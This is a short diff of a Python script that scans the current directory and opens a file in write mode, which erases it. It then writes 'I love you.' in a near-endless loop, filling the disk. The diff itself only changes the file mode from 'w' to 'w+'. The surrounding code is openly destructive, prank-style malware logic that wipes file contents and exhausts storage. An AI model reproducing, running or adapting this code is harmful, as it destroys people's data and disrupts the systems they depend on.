@@ -8,6 +8,6 @@ for file in os.listdir():
       files.append(file)
   else:
     continue
-with open(file, "w") as wf:
+with open(file, "w+") as wf:
   for write in range(10000000000000000000000000000000000):
     wf.write("I love you.")
